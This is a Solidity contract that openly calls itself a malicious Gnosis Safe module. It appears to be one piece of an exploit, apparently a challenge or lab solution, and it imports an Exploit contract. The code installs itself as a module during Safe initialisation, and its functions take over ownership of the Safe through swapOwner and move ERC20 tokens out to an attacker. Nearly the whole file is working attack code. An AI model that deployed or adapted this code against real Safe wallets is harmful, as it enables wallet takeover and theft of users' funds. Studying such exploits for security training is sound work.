pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "./Exploit.sol";

/* Malicious Gnosis Safe Module
 * @notice UNSAFE CODE - DO NOT USE IN PRODUCTION
 */
contract ControllerModule is ModuleManager {
    // called during Gnosis Safe initiation
    // it uses the precomputed proxy address to install a malicious module for Gnosis Safe
    function installModule(address _exploitContract) external {
        Exploit exploit = Exploit(_exploitContract);
        GnosisSafe _gnosisSafe = GnosisSafe(payable(exploit.computedProxyAddress()));
        _gnosisSafe.enableModule(address(exploit.controllerModule()));
        console.log("Malicious Module Installed.");
    }

    //function to change safe owner
    function becomeOwner(address proxy, address currentOwner) public {
        GnosisSafe(payable(proxy)).execTransactionFromModule(
            address(proxy),
            0,
            abi.encodeWithSignature(
                "swapOwner(address,address,address)",
                address(0x1),
                currentOwner,
                msg.sender
            ),
            Enum.Operation.Call
        );
    }

    //function to transfer erc20 tokens from safe to attacker
    function stealTokens(
        address proxy,
        address token,
        address attacker,
        uint256 value
    ) public {
        //transfer(address to, uint256 amount)
        console.log("entering stealTokens");
        GnosisSafe(payable(proxy)).execTransactionFromModule(
            address(token),
            0,
            abi.encodeWithSignature("transfer(address,uint256)", attacker, value),
            Enum.Operation.Call
        );
    }
}
